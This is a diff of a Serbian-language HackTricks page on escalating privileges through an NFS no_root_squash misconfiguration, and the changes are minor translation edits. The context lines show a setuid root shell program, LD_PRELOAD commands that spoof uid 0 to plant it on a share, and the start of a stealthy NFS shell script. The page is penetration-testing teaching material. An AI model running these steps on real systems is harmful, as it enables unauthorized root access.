@@ -1,6 +1,6 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-Pročitajte _ **/etc/exports** _ datoteku, ako pronađete neku direktoriju koja je konfigurisana kao **no_root_squash**, tada možete **pristupiti** njoj **kao klijent** i **pisati unutar** te direktorije **kao** da ste lokalni **root** mašine.
+Pročitajte _ **/etc/exports** _ datoteku, ako pronađete neku direktoriju koja je konfigurisana kao **no_root_squash**, tada možete **pristupiti** toj direktoriji **kao klijent** i **pisati unutar** te direktorije **kao** da ste lokalni **root** mašine.
 
 **no_root_squash**: Ova opcija u suštini daje ovlašćenje root korisniku na klijentu da pristupi datotekama na NFS serveru kao root. I to može dovesti do ozbiljnih bezbednosnih implikacija.
 
@@ -43,13 +43,13 @@ cd <SHAREDD_FOLDER>
 
 > [!NOTE]
 > Imajte na umu da ako možete da kreirate **tunel sa vašeg računara na računar žrtve, još uvek možete koristiti Remote verziju da iskoristite ovu eskalaciju privilegija tunelovanjem potrebnih portova**.\
-> Sledeći trik se koristi u slučaju da datoteka `/etc/exports` **ukazuje na IP**. U ovom slučaju **nećete moći da koristite** u bilo kom slučaju **remote exploit** i biće potrebno da **iskoristite ovaj trik**.\
+> Sledeći trik se koristi u slučaju da datoteka `/etc/exports` **ukazuje na IP**. U ovom slučaju **nećete moći da koristite** u bilo kom slučaju **remote exploit** i biće potrebno da **zloupotrebite ovaj trik**.\
 > Još jedan neophodan uslov za rad eksploata je da **izvoz unutar `/etc/export`** **mora koristiti `insecure` flag**.\
 > --_Nisam siguran da li će ovaj trik raditi ako `/etc/export` ukazuje na IP adresu_--
 
 ## Osnovne Informacije
 
-Scenario uključuje iskorišćavanje montiranog NFS dela na lokalnom računaru, koristeći grešku u NFSv3 specifikaciji koja omogućava klijentu da specificira svoj uid/gid, potencijalno omogućavajući neovlašćen pristup. Eksploatacija uključuje korišćenje [libnfs](https://github.com/sahlberg/libnfs), biblioteke koja omogućava falsifikovanje NFS RPC poziva.
+Scenario uključuje eksploataciju montiranog NFS dela na lokalnom računaru, koristeći grešku u NFSv3 specifikaciji koja omogućava klijentu da specificira svoj uid/gid, potencijalno omogućavajući neovlašćen pristup. Eksploatacija uključuje korišćenje [libnfs](https://github.com/sahlberg/libnfs), biblioteke koja omogućava falsifikovanje NFS RPC poziva.
 
 ### Kompilacija Biblioteke
 
@@ -62,7 +62,7 @@ gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib
 ```
 ### Sprovođenje Eksploata
 
-Eksploit uključuje kreiranje jednostavnog C programa (`pwn.c`) koji povećava privilegije na root i zatim izvršava shell. Program se kompajlira, a rezultantni binarni fajl (`a.out`) se postavlja na share sa suid root, koristeći `ld_nfs.so` da lažira uid u RPC pozivima:
+Eksploit uključuje kreiranje jednostavnog C programa (`pwn.c`) koji povećava privilegije na root i zatim izvršava shell. Program se kompajlira, a rezultantni binarni fajl (`a.out`) se postavlja na deljenje sa suid root, koristeći `ld_nfs.so` da lažira uid u RPC pozivima:
 
 1. **Kompajlirajte kod eksploata:**
 
@@ -72,7 +72,7 @@ int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
 
-2. **Postavite eksploat na share i izmenite njegove dozvole lažiranjem uid-a:**
+2. **Postavite eksploat na deljenje i izmenite njegove dozvole lažiranjem uid-a:**
 
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
@@ -89,7 +89,7 @@ LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs:/
 
 ## Bonus: NFShell za Diskretni Pristup Fajlovima
 
-Kada se dobije root pristup, za interakciju sa NFS share-om bez promene vlasništva (da bi se izbegli tragovi), koristi se Python skripta (nfsh.py). Ova skripta prilagođava uid da odgovara onom fajlu koji se pristupa, omogućavajući interakciju sa fajlovima na share-u bez problema sa dozvolama:
+Kada se dobije root pristup, za interakciju sa NFS deljenjem bez promene vlasništva (da bi se izbegli tragovi), koristi se Python skripta (nfsh.py). Ova skripta prilagođava uid da odgovara onom fajlu koji se pristupa, omogućavajući interakciju sa fajlovima na deljenju bez problema sa dozvolama:
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
